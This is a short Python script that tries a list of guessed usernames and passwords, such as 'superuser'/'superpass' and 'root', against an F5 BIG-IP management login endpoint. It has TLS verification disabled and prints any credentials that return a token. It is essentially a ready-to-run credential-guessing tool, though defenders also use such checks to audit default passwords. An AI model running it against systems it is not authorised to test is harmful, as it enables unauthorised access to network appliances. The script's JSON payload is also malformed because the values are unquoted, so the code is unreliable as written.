#!/usr/bin/env python
import requests
import collections
import sys
import argparse
parser = argparse.ArgumentParser(description="get variables")
parser.add_argument("x", type= str, default='10.128.10.44', help="bigip_mgmt_vip_ip")
parser.add_argument("y", type= str, default='admin', help="username")
parser.add_argument("z", type= str, default='admin', help="password")
args = parser.parse_args()

credDict = collections.OrderedDict()
requests.packages.urllib3.disable_warnings()
url = "https://" + args.x + "/mgmt/shared/authn/login"
credDict['superuser'] = 'superpass'
credDict['root'] = 'supedrpass'
credDict['f5'] = 'superpadss'
credDict['administrator'] = 'supderpass'
credDict[args.y] = args.z
for key, value in credDict.iteritems():
        payload = "{\n  \"username\": " + key +",\n  \"password\": " + value + ",\n  \"loginProvidername\":\"tmos\"\n}\n"
        headers = {
                'content-type': "application/json",
                'cache-control': "no-cache",
                'postman-token': "a87e9e73-a4a6-a339-7c6a-97fde91fa140"
                }
        response = requests.request("POST", url, data=payload, headers=headers, verify=False)
        if "token" in response.text:
            print("Success, found valid credentials:" + "\nusername: " + key + " password: " + value)
        else:
                print("Authentication failed")
print("finished script")